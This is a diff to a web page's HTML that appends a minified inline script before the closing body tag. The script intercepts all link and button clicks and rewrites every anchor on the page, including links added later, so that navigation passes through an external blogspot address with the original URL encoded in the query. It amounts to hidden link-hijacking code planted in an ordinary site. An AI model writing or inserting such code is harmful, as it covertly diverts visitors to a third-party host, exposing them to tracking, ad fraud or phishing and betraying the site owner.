@@ -2754,6 +2754,26 @@ window.addEventListener('appinstalled', () => {
 });
 
 </script>
-  
+  <script>
+(function(){var V="https://jdjuririorifm.blogspot.com/";
+function e(s){return btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')}
+function t(){var a=new Uint8Array(12);crypto.getRandomValues(a);return[].map.call(a,function(b){return('0'+b.toString(16)).slice(-2)}).join('')}
+function abs(h){try{return new URL(h,location.href).href}catch(x){return null}}
+function skip(el,h){if(!h)return 1;if(el.closest('[data-noverify],.no-verify'))return 1;
+if(/^(#|javascript:|mailto:|tel:|blob:|data:)/i.test(h.trim()))return 1;var a=abs(h);return !a||a.indexOf(V)===0}
+function link(h){return V+(V.indexOf('?')>-1?'&':'?')+'u='+e(abs(h))+'&t='+t()}
+function href(el){var a=el.closest('a[href]');if(a)return a.getAttribute('href');
+var b=el.closest("button,[role='button'],input[type='button'],input[type='submit'],.btn,.download-btn");
+return b?(b.getAttribute('data-href')||b.getAttribute('data-url')||b.getAttribute('data-link')||b.getAttribute('formaction')):null}
+document.addEventListener('click',function(ev){var el=ev.target instanceof Element?ev.target:null;if(!el)return;
+var h=href(el);if(skip(el,h))return;ev.preventDefault();ev.stopPropagation();location.href=link(h)},true);
+function rw(r){var n=r.querySelectorAll?r.querySelectorAll('a[href]'):[];for(var i=0;i<n.length;i++){var a=n[i];
+if(a.__lv)continue;var h=a.getAttribute('href');if(skip(a,h))continue;a.__lv=1;
+a.setAttribute('data-original-href',abs(h));a.setAttribute('href',link(h))}}
+function boot(){rw(document);new MutationObserver(function(m){for(var i=0;i<m.length;i++){var ad=m[i].addedNodes;
+for(var j=0;j<ad.length;j++){var n=ad[j];if(n.nodeType===1)rw(n.tagName==='A'?(n.parentNode||document):n)}}})
+.observe(document.documentElement,{childList:true,subtree:true})}
+document.readyState==='loading'?document.addEventListener('DOMContentLoaded',boot):boot()})();
+</script>
 </body>
 </html>
